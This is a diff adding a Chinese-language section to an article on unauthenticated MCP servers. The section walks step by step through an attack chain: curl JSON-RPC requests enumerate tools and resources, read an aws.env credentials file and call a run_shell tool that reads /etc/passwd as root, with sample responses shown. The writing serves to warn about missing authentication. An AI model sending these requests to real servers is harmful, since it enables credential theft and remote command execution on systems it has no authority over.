@@ -142,6 +142,164 @@ data: /internal/mcp-server/v2/messages/?session_id=...&env=prod&region=us-east-1
 
 路径本身就在泄露部署信息。
 
+## 攻击链：从发现到利用
+
+上面说的每个暴露面不是孤立的，它们是攻击链上的连续步骤。完整走一遍：
+
+**Step 1：发现服务**
+
+端口扫描发现 `10.0.12.44:8000` 开着 HTTP。发一个 initialize：
+
+```bash
+curl -s -X POST http://10.0.12.44:8000/mcp \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"test","version":"1.0"}}}'
+```
+
+响应：
+
+```json
+{
+  "result": {
+    "protocolVersion": "2025-03-26",
+    "serverInfo": {"name": "internal-ops-mcp", "version": "0.9.2"},
+    "capabilities": {"tools": {}, "resources": {}}
+  }
+}
+```
+
+服务存在，没有 401，没有 WWW-Authenticate。继续。
+
+**Step 2：枚举能力**
+
+```bash
+curl -s -X POST http://10.0.12.44:8000/mcp \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
+```
+
+响应：
+
+```json
+{
+  "result": {
+    "tools": [
+      {
+        "name": "run_shell",
+        "description": "Run a shell command on the server",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "command": {"type": "string", "description": "Shell command to execute"}
+          },
+          "required": ["command"]
+        }
+      },
+      {
+        "name": "read_file",
+        "description": "Read a file from the server filesystem",
+        "inputSchema": {
+          "type": "object",
+          "properties": {"path": {"type": "string"}},
+          "required": ["path"]
+        }
+      },
+      {
+        "name": "query_db",
+        "description": "Run SQL query on production database",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "sql": {"type": "string"},
+            "db": {"type": "string", "default": "prod_users"}
+          },
+          "required": ["sql"]
+        }
+      }
+    ]
+  }
+}
+```
+
+不需要逆向任何业务逻辑。三个工具，三条攻击路径，参数 schema 全写在里面。
+
+**Step 3：读资源**
+
+```bash
+curl -s -X POST http://10.0.12.44:8000/mcp \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","id":3,"method":"resources/list","params":{}}'
+```
+
+响应：
+
+```json
+{
+  "result": {
+    "resources": [
+      {"uri": "file:///app/config/database.yaml", "mimeType": "text/yaml"},
+      {"uri": "file:///app/config/aws.env", "mimeType": "text/plain"},
+      {"uri": "db://prod-db/users", "mimeType": "application/json"}
+    ]
+  }
+}
+```
+
+`aws.env`。继续。
+
+**Step 4：读取敏感配置**
+
+```bash
+curl -s -X POST http://10.0.12.44:8000/mcp \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","id":4,"method":"resources/read","params":{"uri":"file:///app/config/aws.env"}}'
+```
+
+响应：
+
+```json
+{
+  "result": {
+    "contents": [
+      {
+        "uri": "file:///app/config/aws.env",
+        "mimeType": "text/plain",
+        "text": "AWS_ACCESS_KEY_ID=AKIA...\nAWS_SECRET_ACCESS_KEY=...\nAWS_DEFAULT_REGION=us-east-1\n"
+      }
+    ]
+  }
+}
+```
+
+**Step 5：调用工具**
+
+用 `run_shell` 在服务器上执行命令：
+
+```bash
+curl -s -X POST http://10.0.12.44:8000/mcp \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"run_shell","arguments":{"command":"id && hostname && cat /etc/passwd | head -5"}}}'
+```
+
+响应：
+
+```json
+{
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "uid=0(root) gid=0(root) groups=0(root)\nprod-mcp-01\nroot:x:0:0:root:/root:/bin/bash\n..."
+      }
+    ]
+  }
+}
+```
+
+从发现端口到 root shell，五个 JSON-RPC 请求，没有凭证，没有漏洞利用，没有 0day——协议设计本来就是这样工作的，只是没有加锁。
+
+这一条链的前提只有一个：Step 1 里 initialize 没有返回 401。
+
 ## 为什么比传统 HTTP API 更危险
 
 传统 REST API 暴露的是"接口"，MCP 暴露的是"能力"。
